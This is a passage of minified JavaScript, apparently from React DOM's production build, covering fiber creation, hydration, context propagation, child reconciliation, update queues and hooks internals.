r=t.alternate;r!==null&&(r.lanes|=a);for(var l=!1,u=t.return;u!==null;)u.childLanes|=a,r=u.alternate,r!==null&&(r.childLanes|=a),u.tag===22&&(t=u.stateNode,t===null||t._visibility&1||(l=!0)),t=u,u=u.return;return t.tag===3?(u=t.stateNode,l&&n!==null&&(l=31-ue(a),t=u.hiddenUpdates,r=t[l],r===null?t[l]=[n]:r.push(n),n.lane=a|536870912),u):null}function Fl(t){if(50<Wo)throw Wo=0,Cc=null,Error(s(185));for(var n=t.return;n!==null;)t=n,n=t.return;return t.tag===3?t.stateNode:null}var cs={};function gy(t,n,a,r){this.tag=t,this.key=a,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function qn(t,n,a,r){return new gy(t,n,a,r)}function df(t){return t=t.prototype,!(!t||!t.isReactComponent)}function pa(t,n){var a=t.alternate;return a===null?(a=qn(t.tag,n,t.key,t.mode),a.elementType=t.elementType,a.type=t.type,a.stateNode=t.stateNode,a.alternate=t,t.alternate=a):(a.pendingProps=n,a.type=t.type,a.flags=0,a.subtreeFlags=0,a.deletions=null),a.flags=t.flags&1206910976,a.childLanes=t.childLanes,a.lanes=t.lanes,a.child=t.child,a.memoizedProps=t.memoizedProps,a.memoizedState=t.memoizedState,a.updateQueue=t.updateQueue,n=t.dependencies,a.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},a.sibling=t.sibling,a.index=t.index,a.ref=t.ref,a.refCleanup=t.refCleanup,a}function Ym(t,n){t.flags&=1206910978;var a=t.alternate;return a===null?(t.childLanes=0,t.lanes=n,t.child=null,t.subtreeFlags=0,t.memoizedProps=null,t.memoizedState=null,t.updateQueue=null,t.dependencies=null,t.stateNode=null):(t.childLanes=a.childLanes,t.lanes=a.lanes,t.child=a.child,t.subtreeFlags=0,t.deletions=null,t.memoizedProps=a.memoizedProps,t.memoizedState=a.memoizedState,t.updateQueue=a.updateQueue,t.type=a.type,n=a.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext}),t}function Hl(t,n,a,r,l,u){var g=0;if(r=t,typeof r=="function")df(r)&&(g=1);else if(typeof r=="string")g=kM(t,a,Ve.current)?26:t==="html"||t==="head"||t==="body"?27:5;else t:switch(r){case gt:return t=qn(31,a,n,l),t.elementType=gt,t.lanes=u,t;case V:return Er(a.children,l,u,n);case $:g=8,l|=24;break;case ft:return t=qn(12,a,n,l|2),t.elementType=ft,t.lanes=u,t;case W:return t=qn(13,a,n,l),t.elementType=W,t.lanes=u,t;case ht:return t=qn(19,a,n,l),t.elementType=ht,t.lanes=u,t;case Bt:case z:return t=l|32,t=qn(30,a,n,t),t.elementType=z,t.lanes=u,t.stateNode={autoName:null,paired:null,clones:null,ref:null},t;default:if(typeof r=="object"&&r!==null)switch(r.$$typeof){case et:g=10;break t;case j:g=9;break t;case q:g=11;break t;case lt:g=14;break t;case mt:g=16,r=null;break t}g=29,a=Error(s(130,t===null?"null":typeof t,"")),r=null}return n=qn(g,a,n,l),n.elementType=t,n.type=r,n.lanes=u,n}function Er(t,n,a,r){return t=qn(7,t,r,n),t.lanes=a,t}function hf(t,n,a){return t=qn(6,t,null,n),t.lanes=a,t}function Zm(t){var n=qn(18,null,null,0);return n.stateNode=t,n}function pf(t,n,a){return n=qn(4,t.children!==null?t.children:[],t.key,n),n.lanes=a,n.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},n}var Km=new WeakMap;function gi(t,n){if(typeof t=="object"&&t!==null){var a=Km.get(t);return a!==void 0?a:(n={value:t,source:n,stack:xt(n)},Km.set(t,n),n)}return{value:t,source:n,stack:xt(n)}}var us=[],fs=0,Gl=null,bo=0,_i=[],vi=0,Ha=null,ki=1,Wi="";function ma(t,n){us[fs++]=bo,us[fs++]=Gl,Gl=t,bo=n}function jm(t,n,a){_i[vi++]=ki,_i[vi++]=Wi,_i[vi++]=Ha,Ha=t;var r=ki;t=Wi;var l=32-ue(r)-1;r&=~(1<<l),a+=1;var u=32-ue(n)+l;if(30<u){var g=l-l%5;u=(r&(1<<g)-1).toString(32),r>>=g,l-=g,ki=1<<32-ue(n)+l|a<<l|r,Wi=u+t}else ki=1<<u|a<<l|r,Wi=t}function Vl(t){t.return!==null&&(ma(t,1),jm(t,1,0))}function mf(t){for(;t===Gl;)Gl=us[--fs],us[fs]=null,bo=us[--fs],us[fs]=null;for(;t===Ha;)Ha=_i[--vi],_i[vi]=null,Wi=_i[--vi],_i[vi]=null,ki=_i[--vi],_i[vi]=null}function Qm(t,n){_i[vi++]=ki,_i[vi++]=Wi,_i[vi++]=Ha,ki=n.id,Wi=n.overflow,Ha=t}var Mn=null,Qe=null,xe=!1,Ga=null,xi=!1,gf=Error(s(519));function Va(t){var n=Error(s(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw To(gi(n,t)),gf}function Jm(t){var n=t.stateNode,a=t.type,r=t.memoizedProps;switch(n[A]=t,n[H]=r,a){case"dialog":Ee("cancel",n),Ee("close",n);break;case"iframe":case"object":case"embed":Ee("load",n);break;case"video":case"audio":for(a=0;a<Yo.length;a++)Ee(Yo[a],n);break;case"source":Ee("error",n);break;case"img":case"image":case"link":Ee("error",n),Ee("load",n);break;case"details":Ee("toggle",n);break;case"input":Ee("invalid",n),um(n,r.value,r.defaultValue,r.checked,r.defaultChecked,r.type,r.name,!0);break;case"select":Ee("invalid",n);break;case"textarea":Ee("invalid",n),dm(n,r.value,r.defaultValue,r.children)}a=r.children,typeof a!="string"&&typeof a!="number"&&typeof a!="bigint"||n.textContent===""+a||r.suppressHydrationWarning===!0||x_(n.textContent,a)?(r.popover!=null&&(Ee("beforetoggle",n),Ee("toggle",n)),r.onScroll!=null&&Ee("scroll",n),r.onScrollEnd!=null&&Ee("scrollend",n),r.onClick!=null&&(n.onclick=Xi),n=!0):n=!1,n||Va(t,!0)}function Xl(t){for(Mn=t.return;Mn;)switch(Mn.tag){case 5:case 31:case 13:xi=!1;return;case 27:case 3:xi=!0;return;default:Mn=Mn.return}}function ds(t){if(t!==Mn)return!1;if(!xe)return Xl(t),xe=!0,!1;var n=t.tag,a;if((a=n!==3&&n!==27)&&((a=n===5)&&(a=t.type,a=!(a!=="form"&&a!=="button")||qd(t.type,t.memoizedProps)),a=!a),a&&Qe&&Va(t),Xl(t),n===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(s(317));Qe=B_(t)}else if(n===31){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(s(317));Qe=B_(t)}else n===27?(n=Qe,ar(t.type)?(t=eh,eh=null,Qe=t):Qe=n):Qe=Mn?yi(t.stateNode.nextSibling):null;return!0}function br(){Qe=Mn=null,xe=!1}function _f(){var t=Ga;return t!==null&&(Kn===null?Kn=t:Kn.push.apply(Kn,t),Ga=null),t}function To(t){Ga===null?Ga=[t]:Ga.push(t)}var vf=Se(null),Tr=null,ga=null;function Xa(t,n,a){ie(vf,n._currentValue),n._currentValue=a}function _a(t){t._currentValue=vf.current,ee(vf)}function kl(t,n,a){for(;t!==null;){var r=t.alternate;if((t.childLanes&n)!==n?(t.childLanes|=n,r!==null&&(r.childLanes|=n)):r!==null&&(r.childLanes&n)!==n&&(r.childLanes|=n),t===a)break;t=t.return}}function xf(t,n,a,r){var l=t.child;for(l!==null&&(l.return=t);l!==null;){var u=l.dependencies;if(u!==null){var g=l.child;u=u.firstContext;t:for(;u!==null;){var R=u;u=l;for(var I=0;I<n.length;I++)if(R.context===n[I]){u.lanes|=a,R=u.alternate,R!==null&&(R.lanes|=a),kl(u.return,a,t),r||(g=null);break t}u=R.next}}else if(l.tag===18){if(g=l.return,g===null)throw Error(s(341));g.lanes|=a,u=g.alternate,u!==null&&(u.lanes|=a),kl(g,a,t),g=null}else l.tag===13&&l.memoizedState!==null&&l.memoizedState.dehydrated===null?(l.lanes|=a,g=l.alternate,g!==null&&(g.lanes|=a),kl(l.return,a,t),g=l.child,g=g!==null?g.sibling:null):g=l.child;if(g!==null)g.return=l;else for(g=l;g!==null;){if(g===t){g=null;break}if(l=g.sibling,l!==null){l.return=g.return,g=l;break}g=g.return}l=g}}function Ar(t,n,a,r){t=null;for(var l=n,u=!1;l!==null;){if(!u){if((l.flags&524288)!==0)u=!0;else if((l.flags&262144)!==0)break}if(l.tag===10){var g=l.alternate;if(g===null)throw Error(s(387));if(g=g.memoizedProps,g!==null){var R=l.type;ii(l.pendingProps.value,g.value)||(t!==null?t.push(R):t=[R])}}else if(l===$e.current){if(g=l.alternate,g===null)throw Error(s(387));g.memoizedState.memoizedState!==l.memoizedState.memoizedState&&(t!==null?t.push(zs):t=[zs])}l=l.return}return t!==null&&xf(n,t,a,r),n.flags|=262144,t!==null}function Wl(t){for(t=t.firstContext;t!==null;){if(!ii(t.context._currentValue,t.memoizedValue))return!0;t=t.next}return!1}function Rr(t){Tr=t,ga=null,t=t.dependencies,t!==null&&(t.firstContext=null)}function An(t){return $m(Tr,t)}function ql(t,n){return Tr===null&&Rr(t),$m(t,n)}function $m(t,n){var a=n._currentValue;if(n={context:n,memoizedValue:a,next:null},ga===null){if(t===null)throw Error(s(308));ga=n,t.dependencies={lanes:0,firstContext:n},t.flags|=524288}else ga=ga.next=n;return a}var _y=typeof AbortController<"u"?AbortController:function(){var t=[],n=this.signal={aborted:!1,addEventListener:function(a,r){t.push(r)}};this.abort=function(){n.aborted=!0,t.forEach(function(a){return a()})}},vy=o.unstable_scheduleCallback,xy=o.unstable_NormalPriority,dn={$$typeof:et,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function Sf(){return{controller:new _y,data:new Map,refCount:0}}function Ao(t){t.refCount--,t.refCount===0&&vy(xy,function(){t.controller.abort()})}function t0(t,n){if((t.pendingLanes&4194048)!==0){var a=t.transitionTypes;for(a===null&&(a=t.transitionTypes=[]),t=0;t<n.length;t++){var r=n[t];a.indexOf(r)===-1&&a.push(r)}}}var Ro=null;function Sy(t){var n=t.transitionTypes;return t.transitionTypes=null,n}var Co=null,yf=0,Cr=0,hs=null;function yy(t,n){if(Co===null){var a=Co=[];yf=0,Cr=zd(),hs={status:"pending",value:void 0,then:function(r){a.push(r)}}}return yf++,n.then(e0,e0),n}function e0(){if(--yf===0&&(Ro=null,Co!==null)){hs!==null&&(hs.status="fulfilled");var t=Co;Co=null,Cr=0,hs=null;for(var n=0;n<t.length;n++)(0,t[n])()}}function My(t,n){var a=[],r={status:"pending",value:null,reason:null,then:function(l){a.push(l)}};return t.then(function(){r.status="fulfilled",r.value=n;for(var l=0;l<a.length;l++)(0,a[l])(n)},function(l){for(r.status="rejected",r.reason=l,l=0;l<a.length;l++)(0,a[l])(void 0)}),r}var n0=_t.S;_t.S=function(t,n){if(Zg=Wt(),typeof n=="object"&&n!==null&&typeof n.then=="function"&&yy(t,n),Ro!==null)for(var a=Ds;a!==null;)t0(a,Ro),a=a.next;if(a=t.types,a!==null){for(var r=Ds;r!==null;)t0(r,a),r=r.next;if(Cr!==0){r=Ro,r===null&&(r=Ro=[]);for(var l=0;l<a.length;l++){var u=a[l];r.indexOf(u)===-1&&r.push(u)}}}n0!==null&&n0(t,n)};var wr=Se(null);function Mf(){var t=wr.current;return t!==null?t:Ke.pooledCache}function Yl(t,n){n===null?ie(wr,wr.current):ie(wr,n.pool)}function i0(){var t=Mf();return t===null?null:{parent:dn._currentValue,pool:t}}var ps=Error(s(460)),Ef=Error(s(474)),Zl=Error(s(542)),Kl={then:function(){}};function a0(t){return t=t.status,t==="fulfilled"||t==="rejected"}function r0(t,n,a){switch(a=t[a],a===void 0?t.push(n):a!==n&&(n.then(Xi,Xi),n=a),n.status){case"fulfilled":return n.value;case"rejected":throw t=n.reason,o0(t),t===void 0&&!("reason"in n)?Error(s(600)):t;default:if(typeof n.status=="string")n.then(Xi,Xi);else{if(t=Ke,t!==null&&100<t.shellSuspendCounter)throw Error(s(482));t=n,t.status="pending",t.then(function(r){if(n.status==="pending"){var l=n;l.status="fulfilled",l.value=r}},function(r){if(n.status==="pending"){var l=n;l.status="rejected",l.reason=r}})}switch(n.status){case"fulfilled":return n.value;case"rejected":throw t=n.reason,o0(t),t}throw Dr=n,ps}}function Nr(t){try{var n=t._init;return n(t._payload)}catch(a){throw a!==null&&typeof a=="object"&&typeof a.then=="function"?(Dr=a,ps):a}}var Dr=null;function s0(){if(Dr===null)throw Error(s(459));var t=Dr;return Dr=null,t}function o0(t){if(t===ps||t===Zl)throw Error(s(483))}var ms=null,wo=0;function jl(t){var n=wo;return wo+=1,ms===null&&(ms=[]),r0(ms,t,n)}function ka(t,n){n=n.props.ref,t.ref=n!==void 0?n:null}function Ql(t,n){throw n.$$typeof===b?Error(s(525)):(t=Object.prototype.toString.call(n),Error(s(31,t==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":t)))}function l0(t){function n(K,G){if(t){var nt=K.deletions;nt===null?(K.deletions=[G],K.flags|=16):nt.push(G)}}function a(K,G){if(!t)return null;for(;G!==null;)n(K,G),G=G.sibling;return null}function r(K){for(var G=new Map;K!==null;)K.key===null?G.set(K.index,K):G.set(K.key,K),K=K.sibling;return G}function l(K,G){return K=pa(K,G),K.index=0,K.sibling=null,K}function u(K,G,nt){return K.index=nt,t?(nt=K.alternate,nt!==null?(nt=nt.index,nt<G?(K.flags|=2,G):nt):(K.flags|=134217730,G)):(K.flags|=1048576,G)}function g(K){return t&&K.alternate===null&&(K.flags|=134217730),K}function R(K,G,nt,St){return G===null||G.tag!==6?(G=hf(nt,K.mode,St),G.return=K,G):(G=l(G,nt),G.return=K,G)}function I(K,G,nt,St){var Zt=nt.type;return Zt===V?(K=ct(K,G,nt.props.children,St,nt.key),ka(K,nt),K):G!==null&&(G.elementType===Zt||typeof Zt=="object"&&Zt!==null&&Zt.$$typeof===mt&&Nr(Zt)===G.type)?(G=l(G,nt.props),ka(G,nt),G.return=K,G):(G=Hl(nt.type,nt.key,nt.props,null,K.mode,St),ka(G,nt),G.return=K,G)}function Q(K,G,nt,St){return G===null||G.tag!==4||G.stateNode.containerInfo!==nt.containerInfo||G.stateNode.implementation!==nt.implementation?(G=pf(nt,K.mode,St),G.return=K,G):(G=l(G,nt.children||[]),G.return=K,G)}function ct(K,G,nt,St,Zt){return G===null||G.tag!==7?(G=Er(nt,K.mode,St,Zt),G.return=K,G):(G=l(G,nt),G.return=K,G)}function yt(K,G,nt){if(typeof G=="string"&&G!==""||typeof G=="number"||typeof G=="bigint")return G=hf(""+G,K.mode,nt),G.return=K,G;if(typeof G=="object"&&G!==null){switch(G.$$typeof){case L:return nt=Hl(G.type,G.key,G.props,null,K.mode,nt),ka(nt,G),nt.return=K,nt;case F:return G=pf(G,K.mode,nt),G.return=K,G;case mt:return G=Nr(G),yt(K,G,nt)}if(wt(G)||Y(G))return G=Er(G,K.mode,nt,null),G.return=K,G;if(typeof G.then=="function")return yt(K,jl(G),nt);if(G.$$typeof===et)return yt(K,ql(K,G),nt);Ql(K,G)}return null}function Z(K,G,nt,St){var Zt=G!==null?G.key:null;if(typeof nt=="string"&&nt!==""||typeof nt=="number"||typeof nt=="bigint")return Zt!==null?null:R(K,G,""+nt,St);if(typeof nt=="object"&&nt!==null){switch(nt.$$typeof){case L:return nt.key===Zt?I(K,G,nt,St):null;case F:return nt.key===Zt?Q(K,G,nt,St):null;case mt:return nt=Nr(nt),Z(K,G,nt,St)}if(wt(nt)||Y(nt))return Zt!==null?null:ct(K,G,nt,St,null);if(typeof nt.then=="function")return Z(K,G,jl(nt),St);if(nt.$$typeof===et)return Z(K,G,ql(K,nt),St);Ql(K,nt)}return null}function st(K,G,nt,St,Zt){if(typeof St=="string"&&St!==""||typeof St=="number"||typeof St=="bigint")return K=K.get(nt)||null,R(G,K,""+St,Zt);if(typeof St=="object"&&St!==null){switch(St.$$typeof){case L:return K=K.get(St.key===null?nt:St.key)||null,I(G,K,St,Zt);case F:return K=K.get(St.key===null?nt:St.key)||null,Q(G,K,St,Zt);case mt:return St=Nr(St),st(K,G,nt,St,Zt)}if(wt(St)||Y(St))return K=K.get(nt)||null,ct(G,K,St,Zt,null);if(typeof St.then=="function")return st(K,G,nt,jl(St),Zt);if(St.$$typeof===et)return st(K,G,nt,ql(G,St),Zt);Ql(G,St)}return null}function It(K,G,nt,St){for(var Zt=null,Ae=null,te=G,ae=G=0,mn=null;te!==null&&ae<nt.length;ae++){te.index>ae?(mn=te,te=null):mn=te.sibling;var De=Z(K,te,nt[ae],St);if(De===null){te===null&&(te=mn);break}t&&te&&De.alternate===null&&n(K,te),G=u(De,G,ae),Ae===null?Zt=De:Ae.sibling=De,Ae=De,te=mn}if(ae===nt.length)return a(K,te),xe&&ma(K,ae),Zt;if(te===null){for(;ae<nt.length;ae++)te=yt(K,nt[ae],St),te!==null&&(G=u(te,G,ae),Ae===null?Zt=te:Ae.sibling=te,Ae=te);return xe&&ma(K,ae),Zt}for(te=r(te);ae<nt.length;ae++)mn=st(te,K,ae,nt[ae],St),mn!==null&&(t&&(De=mn.alternate,De!==null&&te.delete(De.key===null?ae:De.key)),G=u(mn,G,ae),Ae===null?Zt=mn:Ae.sibling=mn,Ae=mn);return t&&te.forEach(function(cr){return n(K,cr)}),xe&&ma(K,ae),Zt}function Qt(K,G,nt,St){if(nt==null)throw Error(s(151));for(var Zt=null,Ae=null,te=G,ae=G=0,mn=null,De=nt.next();te!==null&&!De.done;ae++,De=nt.next()){te.index>ae?(mn=te,te=null):mn=te.sibling;var cr=Z(K,te,De.value,St);if(cr===null){te===null&&(te=mn);break}t&&te&&cr.alternate===null&&n(K,te),G=u(cr,G,ae),Ae===null?Zt=cr:Ae.sibling=cr,Ae=cr,te=mn}if(De.done)return a(K,te),xe&&ma(K,ae),Zt;if(te===null){for(;!De.done;ae++,De=nt.next())De=yt(K,De.value,St),De!==null&&(G=u(De,G,ae),Ae===null?Zt=De:Ae.sibling=De,Ae=De);return xe&&ma(K,ae),Zt}for(te=r(te);!De.done;ae++,De=nt.next())De=st(te,K,ae,De.value,St),De!==null&&(t&&(mn=De.alternate,mn!==null&&te.delete(mn.key===null?ae:mn.key)),G=u(De,G,ae),Ae===null?Zt=De:Ae.sibling=De,Ae=De);return t&&te.forEach(function(nE){return n(K,nE)}),xe&&ma(K,ae),Zt}function pe(K,G,nt,St){if(typeof nt=="object"&&nt!==null&&nt.type===V&&nt.key===null&&nt.props.ref===void 0&&(nt=nt.props.children),typeof nt=="object"&&nt!==null){switch(nt.$$typeof){case L:t:{for(var Zt=nt.key;G!==null;){if(G.key===Zt){if(Zt=nt.type,Zt===V){if(G.tag===7){a(K,G.sibling),St=l(G,nt.props.children),ka(St,nt),St.return=K,K=St;break t}}else if(G.elementType===Zt||typeof Zt=="object"&&Zt!==null&&Zt.$$typeof===mt&&Nr(Zt)===G.type){a(K,G.sibling),St=l(G,nt.props),ka(St,nt),St.return=K,K=St;break t}a(K,G);break}else n(K,G);G=G.sibling}nt.type===V?(St=Er(nt.props.children,K.mode,St,nt.key),ka(St,nt),St.return=K,K=St):(St=Hl(nt.type,nt.key,nt.props,null,K.mode,St),ka(St,nt),St.return=K,K=St)}return g(K);case F:t:{for(Zt=nt.key;G!==null;){if(G.key===Zt)if(G.tag===4&&G.stateNode.containerInfo===nt.containerInfo&&G.stateNode.implementation===nt.implementation){a(K,G.sibling),St=l(G,nt.children||[]),St.return=K,K=St;break t}else{a(K,G);break}else n(K,G);G=G.sibling}St=pf(nt,K.mode,St),St.return=K,K=St}return g(K);case mt:return nt=Nr(nt),pe(K,G,nt,St)}if(wt(nt))return It(K,G,nt,St);if(Y(nt)){if(Zt=Y(nt),typeof Zt!="function")throw Error(s(150));return nt=Zt.call(nt),Qt(K,G,nt,St)}if(typeof nt.then=="function")return pe(K,G,jl(nt),St);if(nt.$$typeof===et)return pe(K,G,ql(K,nt),St);Ql(K,nt)}return typeof nt=="string"&&nt!==""||typeof nt=="number"||typeof nt=="bigint"?(nt=""+nt,G!==null&&G.tag===6?(a(K,G.sibling),St=l(G,nt),St.return=K,K=St):(a(K,G),St=hf(nt,K.mode,St),St.return=K,K=St),g(K)):a(K,G)}return function(K,G,nt,St){try{wo=0;var Zt=pe(K,G,nt,St);return ms=null,Zt}catch(te){if(te===ps||te===Zl)throw te;var Ae=qn(29,te,null,K.mode);return Ae.lanes=St,Ae.return=K,Ae}finally{}}}var Ur=l0(!0),c0=l0(!1),Wa=!1;function bf(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function Tf(t,n){t=t.updateQueue,n.updateQueue===t&&(n.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,callbacks:null})}function qa(t){return{lane:t,tag:0,payload:null,callback:null,next:null}}function Ya(t,n,a){var r=t.updateQueue;if(r===null)return null;if(r=r.shared,(Fe&2)!==0){var l=r.pending;return l===null?n.next=n:(n.next=l.next,l.next=n),r.pending=n,n=Fl(t),qm(t,null,a),n}return Bl(t,r,n,a),Fl(t)}function No(t,n,a){if(n=n.updateQueue,n!==null&&(n=n.shared,(a&4194048)!==0)){var r=n.lanes;r&=t.pendingLanes,a|=r,n.lanes=a,uo(t,a)}}function Af(t,n){var a=t.updateQueue,r=t.alternate;if(r!==null&&(r=r.updateQueue,a===r)){var l=null,u=null;if(a=a.firstBaseUpdate,a!==null){do{var g={lane:a.lane,tag:a.tag,payload:a.payload,callback:null,next:null};u===null?l=u=g:u=u.next=g,a=a.next}while(a!==null);u===null?l=u=n:u=u.next=n}else l=u=n;a={baseState:r.baseState,firstBaseUpdate:l,lastBaseUpdate:u,shared:r.shared,callbacks:r.callbacks},t.updateQueue=a;return}t=a.lastBaseUpdate,t===null?a.firstBaseUpdate=n:t.next=n,a.lastBaseUpdate=n}var Rf=!1;function Do(){if(Rf){var t=hs;if(t!==null)throw t}}function Uo(t,n,a,r){Rf=!1;var l=t.updateQueue;Wa=!1;var u=l.firstBaseUpdate,g=l.lastBaseUpdate,R=l.shared.pending;if(R!==null){l.shared.pending=null;var I=R,Q=I.next;I.next=null,g===null?u=Q:g.next=Q,g=I;var ct=t.alternate;ct!==null&&(ct=ct.updateQueue,R=ct.lastBaseUpdate,R!==g&&(R===null?ct.firstBaseUpdate=Q:R.next=Q,ct.lastBaseUpdate=I))}if(u!==null){var yt=l.baseState;g=0,ct=Q=I=null,R=u;do{var Z=R.lane&-536870913,st=Z!==R.lane;if(st?(Te&Z)===Z:(r&Z)===Z){Z!==0&&Z===Cr&&(Rf=!0),ct!==null&&(ct=ct.next={lane:0,tag:R.tag,payload:R.payload,callback:null,next:null});t:{var It=t,Qt=R;Z=n;var pe=a;switch(Qt.tag){case 1:if(It=Qt.payload,typeof It=="function"){yt=It.call(pe,yt,Z);break t}yt=It;break t;case 3:It.flags=It.flags&-65537|128;case 0:if(It=Qt.payload,Z=typeof It=="function"?It.call(pe,yt,Z):It,Z==null)break t;yt=P({},yt,Z);break t;case 2:Wa=!0}}Z=R.callback,Z!==null&&(t.flags|=64,st&&(t.flags|=8192),st=l.callbacks,st===null?l.callbacks=[Z]:st.push(Z))}else st={lane:Z,tag:R.tag,payload:R.payload,callback:R.callback,next:null},ct===null?(Q=ct=st,I=yt):ct=ct.next=st,g|=Z;if(R=R.next,R===null){if(R=l.shared.pending,R===null)break;st=R,R=st.next,st.next=null,l.lastBaseUpdate=st,l.shared.pending=null}}while(!0);ct===null&&(I=yt),l.baseState=I,l.firstBaseUpdate=Q,l.lastBaseUpdate=ct,u===null&&(l.shared.lanes=0),tr|=g,t.lanes=g,t.memoizedState=yt}}function u0(t,n){if(typeof t!="function")throw Error(s(191,t));t.call(n)}function f0(t,n){var a=t.callbacks;if(a!==null)for(t.callbacks=null,t=0;t<a.length;t++)u0(a[t],n)}var Za=Se(null),Jl=Se(0);function d0(t,n){t=Ma,ie(Jl,t),ie(Za,n),Ma=t|n.baseLanes}function Cf(){ie(Jl,Ma),ie(Za,Za.current)}function wf(){Ma=Jl.current,ee(Za),ee(Jl)}var Rn=Se(null),Ln=null;function Ka(t){var n=t.alternate;ie(Cn,Cn.current&1),ie(Rn,t),Ln===null&&(n===null||Za.current!==null||n.memoizedState!==null)&&(Ln=t)}function Nf(t){ie(Cn,Cn.current),ie(Rn,t),Ln===null&&(Ln=t)}function h0(t){t.tag===22?(ie(Cn,Cn.current),ie(Rn,t),Ln===null&&(Ln=t)):ja()}function ja(){ie(Cn,Cn.current),ie(Rn,Rn.current)}function ai(t){ee(Rn),Ln===t&&(Ln=null),ee(Cn)}var Cn=Se(0);function Lo(t,n){ie(Rn,Rn.current),ie(Cn,n)}function Df(t){ee(Cn),ee(Rn),Ln===t&&(Ln=null)}function $l(t){for(var n=t;n!==null;){if(n.tag===13){var a=n.memoizedState;if(a!==null&&(a=a.dehydrated,a===null||$d(a)||th(a)))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!=="independent"){if((n.flags&128)!==0)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===t)break;for(;n.sibling===null;){if(n.return===null||n.return===t)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var va=0,he=null,Ze=null,hn=null,tc=!1,gs=!1,Lr=!1,ec=0,Oo=0,_s=null,Ey=0;function sn(){throw Error(s(321))}function Uf(t,n){if(n===null)return!1;for(var a=0;a<n.length&&a<t.length;a++)if(!ii(t[a],n[a]))return!1;return!0}function Lf(t,n,a,r,l,u){return va=u,he=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,_t.H=t===null||t.memoizedState===null?j0:Q0,Lr=!1,u=a(r,l),Lr=!1,gs&&(u=m0(n,a,r,l)),p0(t),u}function p0(t){_t.H=lc;var n=Ze!==null&&Ze.next!==null;if(va=0,hn=Ze=he=null,tc=!1,Oo=0,_s=null,n)throw Error(s(300));t===null||pn||(t=t.dependencies,t!==null&&Wl(t)&&(pn=!0))}function m0(t,n,a,r){he=t;var l=0;do{if(gs&&(_s=null),Oo=0,gs=!1,25<=l)throw Error(s(301));if(l+=1,hn=Ze=null,t.updateQueue!=null){var u=t.updateQueue;u.lastEffect=null,u.events=null,u.stores=null,u.memoCache!=null&&(u.memoCache.index=0)}_t.H=Dy,u=n(a,r)}while(gs);return u}function by(){var t=_t.H,n=t.useState()[0];return n=typeof n.then=="function"?Po(n):n,t=t.useState()[0],(Ze!==null?Ze.memoizedState:null)!==t&&(he.flags|=1024),n}function Of(){var t=ec!==0;return ec=0,t}function Pf(t,n,a){n.updateQueue=t.updateQueue,n.flags&=-2053,t.lanes&=~a}function If(t){if(tc){for(t=t.memoizedState;t!==null;){var n=t.queue;n!==null&&(n.pending=null),t=t.next}tc=!1}va=0,hn=Ze=he=null,gs=!1,Oo=ec=0,_s=null}function Fn(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return hn===null?he.memoizedState=hn=t:hn=hn.next=t,hn}function un(){if(Ze===null){var t=he.alternate;t=t!==null?t.memoizedState:null}else t=Ze.next;var n=hn===null?he.memoizedState:hn.next;if(n!==null)hn=n,Ze=t;else{if(t===null)throw he.alternate===null?Error(s(467)):Error(s(310));Ze=t,t={memoizedState:Ze.memoizedState,baseState:Ze.baseState,baseQueue:Ze.baseQueue,queue:Ze.queue,next:null},hn===null?he.memoizedState=hn=t:hn=hn.next=t}return hn}function nc(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Po(t){var n=Oo;return Oo+=1,_s===null&&(_s=[]),t=r0(_s,t,n),n=he,(hn===null?n.memoizedState:hn.next)===null&&(n=n.alternate,_t.H=n===null||n.memoizedState===null?j0:Q0),t}function ic(t){if(t!==null&&typeof t=="object"){if(typeof t.then=="function")return Po(t);if(t.$$typeof===pt)return;if(t.$$typeof===et)return An(t)}throw Error(s(438,String(t)))}function zf(t){var n=null,a=he.updateQueue;if(a!==null&&(n=a.memoCache),n==null){var r=he.alternate;r!==null&&(r=r.updateQueue,r!==null&&(r=r.memoCache,r!=null&&(n={data:r.data.map(function(l){return l.slice()}),index:0})))}if(n==null&&(n={data:[],index:0}),a===null&&(a=nc(),he.updateQueue=a),a.memoCache=n,a=n.data[n.index],a===void 0)for(a=n.data[n.index]=Array(t),r=0;r<t;r++)a[r]=Ut;return n.index++,a}function xa(t,n){return typeof n=="function"?n(t):n}function ac(t){var n=un();return Bf(n,Ze,t)}function Bf(t,n,a){var r=t.queue;if(r===null)throw Error(s(311));r.lastRenderedReducer=a;var l=t.baseQueue,u=r.pending;if(u!==null){if(l!==null){var g=l.next;l.next=u.next,u.next=g}n.baseQueue=l=u,r.pending=null}if(u=t.baseState,l===null)t.memoizedState=u;else{n=l.next;var R=g=null,I=null,Q=n,ct=!1;do{var yt=Q.lane&-536870913;if(yt!==Q.lane?(Te&yt)===yt:(va&yt)===yt){var Z=Q.revertLane;if(Z===0)I!==null&&(I=I.next={lane:0,revertLane:0,gesture:null,action:Q.action,hasEagerState:Q.hasEagerState,eagerState:Q.eagerState,next:null}),yt===Cr&&(ct=!0);else if((va&Z)===Z){Q=Q.next,Z===Cr&&(ct=!0);continue}else 